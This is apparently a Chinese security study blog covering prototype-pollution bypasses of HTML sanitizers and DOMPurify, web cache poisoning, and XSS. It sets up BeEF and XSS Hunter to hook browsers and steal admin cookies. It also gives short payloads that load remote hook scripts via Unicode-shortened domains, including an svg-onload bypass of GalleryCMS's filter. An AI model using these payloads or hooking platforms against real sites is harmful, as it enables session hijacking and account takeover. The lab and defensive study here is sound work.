<p>访问 <code>obj1.__proto__</code> 返回 <code>Object.prototype</code> （ <code>__proto__</code> 返回原型的特殊属性也是如此），同时 <code>obj2.__proto__</code> 包含 JSON 中给出的值，即： <code>123</code> . 这证明了 <code>__proto__</code> 属性的处理方式与 <code>JSON.parse</code>  普通 JavaScript 不同。</p>
<p>所以现在想象一个 <code>recursiveMerge</code>  合并两个对象的函数：</p>
<ul>
<li><code>obj1=&#123;&#125;</code></li>
<li><code>obj2=JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;')</code></li>
</ul>
<ol>
<li>遍历 <code>obj2</code> . 唯一的属性是 <code>__proto__</code> 。</li>
<li>检查是否 <code>obj1.__proto__</code> 存在。确实如此。</li>
<li>遍历 <code>obj2.__proto__</code> . 唯一的属性是 <code>x</code> 。</li>
<li>赋值： <code>obj1.__proto__.x = obj2.__proto__.x</code> 。因为 <code>obj1.__proto__</code> 指向 <code>Object.prototype</code> ，则原型被污染。</li>
</ol>
<p>在许多流行的 JS 库中都发现了这种类型的错误，包括<span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNDUwMjAy"> lodash</span> 或<span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL2Jsb2cvYWZ0ZXItdGhyZWUteWVhcnMtb2Ytc2lsZW5jZS1hLW5ldy1qcXVlcnktcHJvdG90eXBlLXBvbGx1dGlvbi12dWxuZXJhYmlsaXR5LWVtZXJnZXMtb25jZS1hZ2Fpbi8="> jQuery</span>。</p>
<p>所有公开的利用原型污染的例子都集中在 NodeJS 上，其目标是实现远程代码执行。</p>
<h3 id="通过原型链污染bypass-html-sanitizer"><a class="markdownIt-Anchor" href="#通过原型链污染bypass-html-sanitizer">#</a> 通过原型链污染 bypass HTML sanitizer</h3>
<p>想象一下，我们有一个只允许 <code>&lt;b&gt;</code>  和 <code>&lt;h1&gt;</code>  标签的 sanitizer。如果我们用以下标记：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; &lt;i&gt;HTML&lt;/i&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>它应该将其清理为以下形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; HTML</span><br></pre></td></tr></table></figure>
<p>HTML sanitizer 需要维护允许的元素属性和元素列表。基本上，库通常采用以下两种方式之一来存储列表：</p>
<p>该库可能有一个包含允许元素列表的数组，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ALLOWED_ELEMENTS = [&quot;h1&quot;, &quot;i&quot;, &quot;b&quot;, &quot;div&quot;]</span><br></pre></td></tr></table></figure>
<p>然后检查是否允许某些元素，他们只需调用 <code>ALLOWED_ELEMENTS.includes(element)</code> . 这种方法可以避免原型污染，因为我们不能扩展数组；也就是说，我们不能污染 <code>length</code>  属性，也不能污染已经存在的索引。即使使用 <code> Object.prototype.length = 10;Object.prototype[0] = 'test';</code> , 然后 <code>ALLOWED_ELEMENTS.length</code>  仍然返回 <code>4</code>  并且 <code>ALLOWED_ELEMENTS[0]</code>  仍然是 <code>&quot;h1&quot;</code> 。</p>
<p>另一种解决方案是存储一个包含允许元素的对象，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ALLOWED_ELEMENTS = &#123; &quot;h1&quot;: true, &quot;i&quot;: true, &quot;b&quot;: true, &quot;div&quot; :true&#125;</span><br></pre></td></tr></table></figure>
<p>然后检查是否允许某些元素，库可能会检查 <code>ALLOWED_ELEMENTS[element]</code> . 这种方法很容易通过原型污染加以利用；因为如果我们通过以下方式污染原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.prototype.SCRIPT = true;</span><br></pre></td></tr></table></figure>
<p>然后 <code>ALLOWED_ELEMENTS[&quot;SCRIPT&quot;]</code>  返回 <code>true</code> 。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427192220087.png" alt="image-20220427192220087"></p>
<h3 id="通过原型链污染bypass-dompurify"><a class="markdownIt-Anchor" href="#通过原型链污染bypass-dompurify">#</a> 通过原型链污染 bypass DOMPurify</h3>
<p>与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png" alt="img"></p>
<p>DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      /* Set configuration parameters */</span><br><span class="line">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class="line">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>
<p>在 JavaScript 中 <code>in</code> ，运算符遍历原型链。因此 <code>'ALLOWED_ATTR' in cfg</code> ，如果此属性存在于 <code>Object.prototype</code> .</p>
<p>DOMPurify 默认允许使用 <code>&lt;img&gt;</code>  标签，因此该漏洞利用只需要 <code>ALLOWED_ATTR</code>  使用 <code>onerror</code>  和进行污染 <code>src</code> 。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png" alt="img"></p>
<p>其他通过原型链污染 bypass xss 过滤框架不在叙述，可以到参考文献中查看</p>
<h3 id="ctf案例原型链污染"><a class="markdownIt-Anchor" href="#ctf案例原型链污染">#</a> CTF 案例：原型链污染</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>
<p>难度太大，就不班门弄斧了…</p>
<h2 id="缓存投毒"><a class="markdownIt-Anchor" href="#缓存投毒">#</a> 缓存投毒</h2>
<p>Web 缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015170751343.png" alt="image-20221015170751343"></p>
<p>缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。可以使用 Varnish 或 CDN 设置网站的缓存</p>
<p>每当缓存服务收到对资源的请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。</p>
<p>确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题；对请求进行逐字节匹配的做法是完全无效的，因为 HTTP 请求充满了无关紧要的数据，例如请求头中的 User-Agent 字段</p>
<p>缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源，但可能导致缓存系统错误认为两个缓存键相同但其他参数不同的请求是等效的，将返回错误的数据。</p>
<p>Web 缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015171200570.png" alt="image-20221015171200570"></p>
<p>非缓存键出现在错误的地方，可以来自于 HTTP 请求头，HTTP 响应，路由，DOM 等。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427202534867.png" alt="image-20220427202534867"></p>
<p>识别缓存键可以使用如下插件～：burpsuite param miner</p>
<p>详细可以看这个文章</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2">https://www.anquanke.com/post/id/156356</span></p>
<p>对应的 burpsuite 也有相应的靶场</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmc=">Web cache poisoning | Web Security Academy (portswigger.net)</span></p>
<p>防御：</p>
<p>针对缓存投毒的最强大防御办法就是禁用缓存。</p>
<p>如果您对确定哪些内容是 “静态” 的足够确认，那么只对纯静态的响应进行缓存也是有效的。</p>
<p>同样，避免从请求头和 cookie 中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。</p>
<p>一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。</p>
<p>最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视 HTTP 请求头中的 XSS 等客户端漏洞。</p>
<h2 id="奇技淫巧"><a class="markdownIt-Anchor" href="#奇技淫巧">#</a> 奇技淫巧</h2>
<h3 id="1通过特殊字符绕过或缩短playload和src长度"><a class="markdownIt-Anchor" href="#1通过特殊字符绕过或缩短playload和src长度">#</a> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</h3>
<p>利用浏览器对 Unicode 兼容性构造 script 中短 src</p>
<script src=//℡℠.㎺>

浏览器可以解析为telsm.pw，但length只有4个字符

https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names

https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html

ſ

ß

TEL

SR

PW

![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png)

利用浏览器对UNiocode支持

![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png)

### 1.1 案例：emersion of XSS with 20 characters limitation

### 1.Xss platform

### 1.1beef-xss

安装：`apt-get install beef-xss`

注意事项：

几种常见的安装报错：

1.更新apt源

![image-20220910205931724](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png)



解决方法：`apt-get update ` `sudo apt-get upgrade`

2.缺省依赖

![image-20220910210020518](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png)

解决方法:`apt-get install libglib2.0-dev `

安装完之后在进行`apt-get install beef-xss`



beef默认路径：`http://127.0.0.1:3000/ui/panel`

![image-20220910210358884](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png)



使用pkav测试：

使用系统提供的payload

![image-20220910233217661](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png)

![image-20220910211111241](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png)

此时再去beef panel查看

![image-20220910211138801](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png)

说明此时已经上线，可以在command中找到命令执行：

说明：

- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见
- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行
- 橙色模块：模块可用，但结果对用户可见
- 灰色模块：模块为在目标浏览器上测试过

最重要的是可以看到cookies，如果对方是管理员登录，那么我们便可以使用管理员cookie进行登录

![image-20220910211534847](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png)

### 2.XSS-hunter

https://xsshunter.com/

1.进行注册

![image-20220910232621209](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png)

2.注册完后系统会自动登录，在XSS fires页面，如果有已经上线的主机会在此显示，payloads页面提供了一些xsspayload

![image-20220910232730320](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png)

3.如果成功上线，会显示如下界面，full report 里面会有后台地址和cookies

![image-20220910233046239](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png)



### 2.1 在centos上安装beef-xss

参考链接：[CentOS安装beEF做XSS平台 - 海鸥博客 - 博客园 (cnblogs.com)](https://www.cnblogs.com/comdodo/p/5506996.html)

但有些需要注意的点

1.上文中的启动rvm不一定是在etc下，是在你自己的安装目录下，启动完后使用rvm 输出版本测试是否成功

我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改rvm版本，是你安装得版本

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.rvm/archives</span><br><span class="line">tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have</span><br></pre></td></tr></table></figure>

这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.rvm/archives/rvm-1.26.11/scripts/rvm</span><br></pre></td></tr></table></figure>

然后rvm命令就可以正常运行了

2.安装ruby时报错没有足够空间：找到安装rvm的目录的/rvm/archives/rvm/scripts/functions/utility文件，

搜索“df”行，您将找到此代码将：

` __free_space="$( \command \df "$1" | __rvm_awk 'BEGIN{x=4} /Free/{x=3} $3=="Avail"{x=3} END{print $x}' )"`

改为

`__free_space="999999"`

同时为了防止checksum报错，需要加参数--verify downloads 2，这个参数不一定有用，建议采用第三条代替

3.安装ruby时可能会非常非常~慢，需要先更改rvm源，其实就和你更改yum源为ali一样的道理

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ruby_url=https://cache.ruby-china.com/pub/ruby&quot; &gt; /usr/local/rvm/user/db</span><br><span class="line">注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db</span><br><span class="line">然后就可以安装 rvm install 2.7</span><br></pre></td></tr></table></figure>

4.提示

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  SSL verification error at depth 0: ok (0)</span><br><span class="line">Error fetching https://ruby.taobao.org/:</span><br></pre></td></tr></table></figure>

更换gem源，参考链接[RubyGems 镜像 - Ruby China (ruby-china.com)](https://gems.ruby-china.com/)

5.下载beef  [Kali Linux / Packages / beef-xss · GitLab](https://gitlab.com/kalilinux/packages/beef-xss)

[GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef) 

建议使用第二个

注意：下载此版本ruby版本必须>3.0.3

6.报错`There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.`

sudo给对应的文件夹递归加权限即可

7.报错`in autodetect': Could not find a JavaScript runtime.`

安装nodejs即可 `yum install nodejs`

8.安装bundle install时非常慢，可以更新bundle源

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br></pre></td></tr></table></figure>

9.显示`/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite >= 3.8. (RuntimeError)`

解决方法：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br><span class="line">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm</span><br><span class="line">$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br></pre></td></tr></table></figure>

10.报错

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[14:15:27][!] ERROR: Default username and password in use!</span><br><span class="line">[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml</span><br></pre></td></tr></table></figure>

解决方法：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim config.yaml   </span><br><span class="line">更改默认密码</span><br></pre></td></tr></table></figure>

也可以参考一下这篇[RVM 安装 Ruby - 大数据从业者FelixZh - 博客园 (cnblogs.com)](https://www.cnblogs.com/felixzh/p/8081622.html)

[安装rvm,升级ruby。跳的坑，做个记录 - 简书 (jianshu.com)](https://www.jianshu.com/p/12d3226d83ee)

但我明显碰到了更多奇奇怪怪的问题

总结：不要再centos上安装beef会变得不幸



### 2.使用45,40，或者20个字符绕过xss长度限制

下面使用gallerycms进行测试，原因是它采用jQuery框架，可以测试某些情况下的最短payload

### 2.1gallerycms安装

1.报错解决方法：

![image-20220911001606531](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png)

1.修改\application\config\database.php中的数据库密码，并且创建对应数据库

2.切换php版本为5.X，因为该CMS使用旧版的CI框架



2.随便注册，登录，此处的Album Name就是注入点

![image-20220911001755992](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png)



### 2.2使用短域名绕过字符限制

短域名定义：通过Unicode编码使Unicode中一个字符被浏览器解析为两个或三个字符，最典型的有如下

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ﬀ expands to `ff`</span><br><span class="line">℠ expands to `sm`</span><br><span class="line">㏛ expands to `sr`</span><br><span class="line">ﬆ expands to `st`</span><br><span class="line">㎭ expands to `rad`</span><br><span class="line">℡ expands to `tel`</span><br></pre></td></tr></table></figure>

因此我们就可以使用Unicode编码来缩短域名长度

因此我注册了一个域名`radsm.co`,使用Unicode表示为`㎭℠.co`。相比之前减少了三个字符

最极限的情况是使用`℡℠.㎺`,注意这里pw其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了pw。。。。

https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names

https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html

后来想起来不止这几个，其实极限域名甚至可以更短。。。



##### 1.没有禁止script标签的情况

使用xsshunt平台：

`<script/src=https://㎭℠.xss.ht>`    

此时该payload为30个字符

使用beef-xss平台

`<script/src=http://㎭℠.co:3000/hook.js>`

此时该payload为30个字符

但注意：src中不加"" 也可以正常解析，同时不加协议也可以正常解析



对于xsshunter平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到xsshunter的域名

注意：国内的域名不支持重定向

![image-20220911004504679](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png)





对于beef-xss平台，由于hook.js这个路径太占长度，我们可以将hook.js写到index.html中，并且将网站使用默认端口省掉:3000这些字符

![image-20220911004816278](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png)

此时我们的极限payload为`<script/src=//㎭℠.㎺>`

![image-20220911005113131](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png)

此时我们可以在19个长度内完成



##### 2前端框架为jQuery，可以使用如下payload：

不过滤script标签：

注意此payload不能缺少"" ，同样需要把hook.js放到index.html中

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

![image-20220911194433247](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png)

过滤script标签

如果没有过滤svg标签。那么此时的payload为：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>

![image-20220911195539757](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png)





##### 3.绕过GalleryCMS

对于用户的输入，gallerycms做了严格的过滤，包括 从长度和内容限制

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">// Validate form.</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">helper</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">library</span>(<span class="string">&#x27;form_validation&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;form_validation-&gt;<span class="title function_ invoke__">set_error_delimiters</span>(<span class="string">&#x27;&lt;div class=&quot;alert alert-error&quot;&gt;&lt;strong&gt;Error: &lt;/strong&gt;&#x27;</span>, <span class="string">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$user_data</span> = <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">all_userdata</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;form_validation-&gt;<span class="title function_ invoke__">set_rules</span>(<span class="string">&#x27;album_name&#x27;</span>, <span class="string">&#x27;Album Name&#x27;</span>, <span class="string">&#x27;trim|required|max_length[45]|xss_clean&#x27;</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



###### 假设没有xss_clean的绕过

注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了

比如：我虚拟机的kali的ip是192.168.13.133，我的gallerycms部署在本机上，我在本机上host文件加一个dns解析，将radsm.co解析到192.168.13.133

![image-20220911201545877](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png)

但要是这样我tm白搭了一天的beef...

这样我们的payload就会变长，我使用的端口为18888，访问时就会变成radsm.co:18888

我们做一下减法payload会多出6个字符，到时候能解析的时候我们的payload就可以少六个



1.payload长度限制为50时

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br><span class="line">payload 中&quot;&quot; 和后半个闭合标签都不能缺少</span><br></pre></td></tr></table></figure>

![image-20220911231941383](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png)

2.payload长度限制为40时

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//㎭℠.co&gt;&#x27;.length</span><br></pre></td></tr></table></figure>

![image-20220911232202908](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png)



###### 存在xss_clean并且长度限制为45个字符时

利用XSS_clean 漏过滤的svg来绕过

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>

注意：如果此时在index.html内写入hook.js，并且使用宝塔面板，一定记着把bt自己的初始页的东西删光，不然无法上线

并且bt使用自己的默认index.html的，在/www/server/panel下，具体可以去bt看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的index.html的



还有一件很诡异的事，我gallerycms搭建在本机192.168.2.13上，beef-xss在kali 192.168.13.133上，在一样的payload前提下，在本机上始终无法上线，但在kali上就可以，本机上进行了域名和ip的尝试，始终不行，最后在kali访问本机的gallerycms成功上线



补充:gallerycms的对新建album的过滤在application/controllers/album.php中，修改长度在这个文件里就能修改前端限制



+1补充：本篇文件缺少一些xss的基础知识，如果看不懂先看[(49条消息) XSS详解及复现gallerycms字符长度限制短域名绕过_薄荷加冰心有多冷的博客-CSDN博客](https://blog.csdn.net/weixin_44811851/article/details/126080728)

这个大佬写的文章







### 3.通过特殊字符变为大写后长度变为原来两倍偷渡非法字符

https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/

假設我有個字串是 `ßßßßßßßß<b>1</b>`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。

在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `<>` 這些字元進去

### 4.利用SVG/details绕过先抓取元素再赋值

document.querySelector( '.note').innerHTML = text;





## 补充：httponly

> 　Cookie分为内存Cookie和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的Cookie，需要获取到用户Cookie+用户浏览器未关闭。如果是硬盘Cookie，则该Cookie是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类Cookie获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。
>
> 　　Cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。Cookie保存在浏览器的document对象中，对于存在XSS漏洞的网站，入侵者可以插入简单的XSS语句执行任意的JS脚本，以XSS攻击的手段获取网站其余用户的Cookie。
>
> 比如，举个简单例子：`<script>alert(document.cookie)</script>`
<blockquote>
<p>Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png" alt="image-20221029192451385"></p>
<p>Cookie 各个参数详细内容：</p>
<ul>
<li>Set-Cookie:http 响应头，向客户端发送 Cookie。</li>
<li>Name=value: 每个 Cookie 必须包含的内容。</li>
<li>Expires=date:EXpires 确定了 Cookie 的有效终止日期，可选。如果缺省，则 Cookie 不保存在硬盘中，只保存在浏览器内存中。</li>
<li>Domain=domain-name: 确定了哪些 inernet 域中的 web 服务器可读取浏览器储存的 Cookie，缺省为该 web 服务器域名。</li>
<li>Path=path: 定义了 web 服务器哪些路径下的页面可获取服务器发送的 Cookie。</li>
<li>Secure: 在 cookie 中标记该变量，表明只有为 https 通信协议时，浏览器才向服务器提交 Cookie。</li>
<li><strong>Httponly: 禁止 javascript 读取，如果 cookie 中的一个参数带有 httponly，则这个参数将不能被 javascript 获取；httponly 可以防止 xss 会话劫持攻击。</strong></li>
</ul>
<p>有的网站为了防止 XSS，所以采用浏览器绑定技术，例如将 Cookie 和浏览器的 User-agent 进行绑定，一旦发现绑定不匹配则认为 Cookie 失效，但是这种方法存在很大的弊端，因为当入侵者获取到 Cookie 的同时也能获取到用户的 User-agent; 另一种防止 XSS 获取用户 Cookie 的方式是将 Cookie 和 Remote-addr 相绑定（即与 IP 绑定），但是这样的弊端是可能会带来极差的用户体验，如家里的 ADSL 拨号上网就是每次拨号连接更换一个 IP 地址。</p>
<p>所以 HttpOnly 就应运而生了。<strong>具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在用户与服务端交互的时候，HttpRequest 包中仍然会带上这个 Cookie 信息，即用户与服务端的正常交互不受影响。如果支持 HttpOnly 的浏览器检测到包含 HttpOnly 标志的 cookie，并且客户端脚本代码尝试读取该 cookie，则浏览器将返回一个空字符串作为结果。</strong></p>
<p>使用了 HttpOnly 只是在一定程度上抵御 XSS 盗取 Cookie 的行为，另外 HttpOnly 也不能防止入侵者做 AJAX 提交。严格来说 HttpOnly 并不是为了对抗 XSS，<strong>它解决的是 XSS 后的 Cookie 劫持问题</strong>，但是 XSS 攻击带来的不仅仅是 Cookie 劫持问题，还有窃取用户信息，模拟身份登录，操作用户账户等一系列问题。所以除了 HttpOnly 之外还需要其他的对抗解决方案。</p>
</blockquote>
<h2 id="参考"><a class="markdownIt-Anchor" href="#参考">#</a> 参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAyMjkxMDgyMTE0OTMxMg==">JavaScript 教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93YW5nZG9jLmNvbS9qYXZhc2NyaXB0Lw==">JavaScript 教程 - 网道 (wangdoc.com)</span></p>
